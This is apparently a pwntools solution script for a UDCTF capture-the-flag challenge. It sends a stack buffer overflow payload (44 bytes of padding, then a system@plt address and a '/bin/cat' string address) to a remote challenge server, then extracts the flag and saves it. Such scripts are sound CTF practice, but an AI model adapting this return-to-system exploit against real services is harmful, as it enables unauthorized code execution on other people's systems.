# coding: utf-8
from pwn import * 
def red(prt):
    return "\033[91m{}\033[00m".format(prt)
def grn(prt):
    return "\033[92m{}\033[00m".format(prt)
def cyn(prt):
    return "\033[96m{}\033[00m".format(prt)
def flag(stuff):
    inner = re.search(r"\{.+\}", stuff).group()
    return  stuff.replace('UDCTF', cyn('UDCTF')).replace(inner.strip('{}'), red(inner.strip('{}'))).replace('{', grn('{')).replace('}', grn('}'))

def save(obj, filename):
    with open(filename, 'wb') as f:
        f.write(obj)

def s(stuff, condition, status):
    if status == 'send':
        print 'sending:', stuff
        r.sendline(stuff)
    msg = ''
    while condition not in msg and 'UDCTF' not in msg:
        while r.can_recv(timeout=0.1):
            msg += r.recv()
    print 'recv:', msg # [-50:]
    return msg

# rop_addr = 0x08048649
# return_address = 0x006161616c
# offset = cyclic_find(return_address) #44
# payload = cyclic(100)

system_plt_addr = 0x8048430
bin_cat_addr = 0x804a030
offset = 44
payload = 'A'*44 + p32(system_plt_addr) + 'A'*4 + p32(bin_cat_addr)

r = remote('52.15.140.126', 5005)
cond = '>'

m = s('', cond, '')
m = s(payload, cond, 'send')
r.close()

temp = 'UDCTF{' + m.split('UDCTF{')[1].split('}')[0] + '}'
print 'FLAG:', flag(temp)
save(flag(temp), 'flag.txt')

